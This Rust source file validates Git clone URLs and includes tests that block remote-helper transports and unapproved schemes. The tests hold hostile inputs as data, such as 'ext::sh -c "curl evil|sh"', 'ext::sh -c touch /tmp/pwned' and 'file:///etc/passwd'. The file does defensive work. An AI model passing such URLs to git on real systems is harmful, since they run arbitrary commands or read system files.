//! Parsing and validation of Git repository URLs.
//!
//! Mirrors the behaviour of "clone repository" dialogs in editors such as
//! VS Code ("Clone Git Repository…") and IntelliJ ("Get from Version
//! Control"): the user types a repository URL and the target directory name
//! is derived from the last path segment of that URL.

use std::fmt;

/// A repository URL that has passed basic validation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RepoUrl {
    raw: String,
}

/// Why a repository URL was rejected.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RepoUrlError {
    /// The input was empty (or only whitespace).
    Empty,
    /// The input does not look like a repository URL (no path component).
    Invalid,
    /// The input uses a transport usagi does not allow — a remote helper
    /// (`ext::`, `fd::`, …) or a non-allow-listed scheme (`file://`, …). See
    /// [`ALLOWED_URL_SCHEMES`].
    UnsupportedTransport,
}

impl fmt::Display for RepoUrlError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            RepoUrlError::Empty => write!(f, "enter a repository URL"),
            RepoUrlError::Invalid => write!(f, "that does not look like a repository URL"),
            RepoUrlError::UnsupportedTransport => {
                write!(f, "unsupported URL transport (use https, ssh, or git)")
            }
        }
    }
}

impl std::error::Error for RepoUrlError {}

impl RepoUrl {
    /// Parse and validate a repository URL.
    ///
    /// Accepts the common Git URL shapes:
    /// - HTTPS: `https://github.com/owner/repo.git`
    /// - SSH (scp-like): `git@github.com:owner/repo.git`
    /// - SSH (URL): `ssh://git@host/owner/repo.git`
    ///
    /// Rejects transports that can run commands or read arbitrary files — git
    /// remote helpers (`ext::`, `fd::`, …) and non-allow-listed schemes
    /// (`file://`, …) — so a hostile URL cannot turn a clone into code execution.
    pub fn parse(input: &str) -> Result<Self, RepoUrlError> {
        let trimmed = input.trim();
        if trimmed.is_empty() {
            return Err(RepoUrlError::Empty);
        }
        // Reject dangerous git transports before anything else: `git clone`
        // treats `ext::sh -c …` as a remote helper that runs an arbitrary
        // command (remote code execution), and `usagi init <url>` is a
        // scriptable, agent-reachable entry point. Only the allow-listed
        // transports may reach `git clone`.
        if !transport_is_allowed(trimmed) {
            return Err(RepoUrlError::UnsupportedTransport);
        }
        // A real URL has a host/path separator and a non-empty final segment.
        let has_separator = trimmed.contains('/') || trimmed.contains(':');
        if !has_separator || final_segment(trimmed).is_none() {
            return Err(RepoUrlError::Invalid);
        }
        Ok(Self {
            raw: trimmed.to_string(),
        })
    }

    /// The validated URL as entered (whitespace trimmed).
    pub fn as_str(&self) -> &str {
        &self.raw
    }

    /// The directory name a clone of this URL would create.
    pub fn directory_name(&self) -> String {
        // Guaranteed to be Some because `parse` rejected URLs without one.
        final_segment(&self.raw).unwrap_or_default()
    }
}

/// URL schemes usagi will hand to `git clone`. The list deliberately excludes
/// `file://` (and every other scheme) so only network transports a clone dialog
/// expects are accepted; remote-helper forms (`ext::`, `fd::`, …) carry no
/// `://` and are caught separately by [`has_remote_helper_prefix`].
const ALLOWED_URL_SCHEMES: &[&str] = &["https", "http", "ssh", "git"];

/// Whether `url`'s git transport is one usagi allows.
///
/// Three shapes reach here:
/// - `scheme://…` — the scheme must be in [`ALLOWED_URL_SCHEMES`].
/// - `<transport>::<address>` — a git remote helper (`ext`, `fd`, …); always
///   rejected, since `ext::sh -c …` is arbitrary command execution.
/// - `[user@]host:path` (scp-like SSH) or a bare local path — no helper and no
///   scheme, so it is allowed.
fn transport_is_allowed(url: &str) -> bool {
    if let Some((scheme, _)) = url.split_once("://") {
        is_scheme_token(scheme)
            && ALLOWED_URL_SCHEMES.contains(&scheme.to_ascii_lowercase().as_str())
    } else {
        !has_remote_helper_prefix(url)
    }
}

/// Whether `s` is a clean URL-scheme token (`https`, `git`, …): a leading letter
/// then letters/digits/`+`/`-`/`.` only. A crafted `ext::…://…` fails this (the
/// `:` is not allowed) so it cannot smuggle an allow-listed scheme.
fn is_scheme_token(s: &str) -> bool {
    let mut chars = s.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic())
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
}

/// Whether `s` begins with a `<transport>::` remote-helper prefix. scp-like
/// SSH URLs use a single colon (`host:path`), so they are not matched.
fn has_remote_helper_prefix(s: &str) -> bool {
    match s.find("::") {
        Some(idx) => is_scheme_token(&s[..idx]),
        None => false,
    }
}

/// Best-effort directory-name suggestion for a possibly-incomplete URL.
///
/// Used to live-update the directory field while the user is still typing the
/// URL. A trailing slash yields `None` so the field stays empty while the user
/// is mid-way through typing the path (e.g. just after `owner/`).
pub fn suggest_directory(input: &str) -> Option<String> {
    last_segment(input.trim())
}

/// Extract the final path segment, stripping a trailing `.git` suffix. Splits
/// on `/` (path) and `:` (scp-like `git@host:owner/repo`). `None` if empty.
fn last_segment(input: &str) -> Option<String> {
    let segment = input.rsplit(['/', ':']).next().unwrap_or("");
    let segment = segment.strip_suffix(".git").unwrap_or(segment);
    if segment.is_empty() {
        None
    } else {
        Some(segment.to_string())
    }
}

/// Like [`last_segment`] but tolerant of trailing slashes — used once the URL
/// is complete so `…/repo/` still resolves to `repo`.
fn final_segment(input: &str) -> Option<String> {
    last_segment(input.trim_end_matches('/'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn derives_directory_from_https_url() {
        let url = RepoUrl::parse("https://github.com/owner/repo.git").unwrap();
        assert_eq!(url.directory_name(), "repo");
    }

    #[test]
    fn derives_directory_from_https_url_without_git_suffix() {
        let url = RepoUrl::parse("https://github.com/owner/repo").unwrap();
        assert_eq!(url.directory_name(), "repo");
    }

    #[test]
    fn derives_directory_from_scp_like_ssh_url() {
        let url = RepoUrl::parse("git@github.com:owner/repo.git").unwrap();
        assert_eq!(url.directory_name(), "repo");
    }

    #[test]
    fn derives_directory_from_ssh_url() {
        let url = RepoUrl::parse("ssh://git@host.example/owner/repo.git").unwrap();
        assert_eq!(url.directory_name(), "repo");
    }

    #[test]
    fn ignores_trailing_slash() {
        let url = RepoUrl::parse("https://github.com/owner/repo/").unwrap();
        assert_eq!(url.directory_name(), "repo");
    }

    #[test]
    fn trims_surrounding_whitespace() {
        let url = RepoUrl::parse("  https://github.com/owner/repo.git  ").unwrap();
        assert_eq!(url.as_str(), "https://github.com/owner/repo.git");
        assert_eq!(url.directory_name(), "repo");
    }

    #[test]
    fn error_messages_are_human_readable() {
        assert_eq!(RepoUrlError::Empty.to_string(), "enter a repository URL");
        assert_eq!(
            RepoUrlError::Invalid.to_string(),
            "that does not look like a repository URL"
        );
    }

    #[test]
    fn rejects_empty_input() {
        assert_eq!(RepoUrl::parse("   "), Err(RepoUrlError::Empty));
    }

    #[test]
    fn rejects_input_without_path() {
        assert_eq!(RepoUrl::parse("notaurl"), Err(RepoUrlError::Invalid));
    }

    #[test]
    fn rejects_remote_helper_transports_that_run_commands() {
        // `git clone "ext::sh -c <cmd>"` invokes the ext remote helper, which
        // runs an arbitrary command — remote code execution. These (and any
        // other `<transport>::<address>` helper) must be rejected outright.
        for url in [
            "ext::sh -c touch /tmp/pwned",
            "ext::sh -c \"curl evil|sh\"",
            "fd::17/foo",
            // A scheme smuggled after a helper prefix must not slip through.
            "ext::https://github.com/owner/repo.git",
        ] {
            assert_eq!(
                RepoUrl::parse(url),
                Err(RepoUrlError::UnsupportedTransport),
                "should reject {url:?}"
            );
        }
    }

    #[test]
    fn rejects_non_allowlisted_url_schemes() {
        for url in ["file:///etc/passwd", "ftp://host/repo.git"] {
            assert_eq!(
                RepoUrl::parse(url),
                Err(RepoUrlError::UnsupportedTransport),
                "should reject {url:?}"
            );
        }
    }

    #[test]
    fn allows_the_expected_transports() {
        // The shapes a clone dialog expects all pass: HTTPS/HTTP/git URLs, SSH
        // URLs, scp-like SSH, and a bare local path (used by tests and local
        // clones — git's implicit file transport, not a `file://` URL).
        for url in [
            "https://github.com/owner/repo.git",
            "http://host/owner/repo.git",
            "git://host/owner/repo.git",
            "ssh://git@host.example/owner/repo.git",
            "git@github.com:owner/repo.git",
            "/tmp/local/src",
        ] {
            assert!(RepoUrl::parse(url).is_ok(), "should accept {url:?}");
        }
    }

    #[test]
    fn unsupported_transport_message_is_human_readable() {
        assert_eq!(
            RepoUrlError::UnsupportedTransport.to_string(),
            "unsupported URL transport (use https, ssh, or git)"
        );
    }

    #[test]
    fn suggests_directory_for_partial_input() {
        assert_eq!(
            suggest_directory("https://github.com/owner/re"),
            Some("re".to_string())
        );
        // A trailing slash means the path segment hasn't been typed yet.
        assert_eq!(suggest_directory("https://github.com/owner/"), None);
        assert_eq!(suggest_directory(""), None);
        assert_eq!(
            suggest_directory("https://github.com/owner/repo"),
            Some("repo".to_string())
        );
    }
}
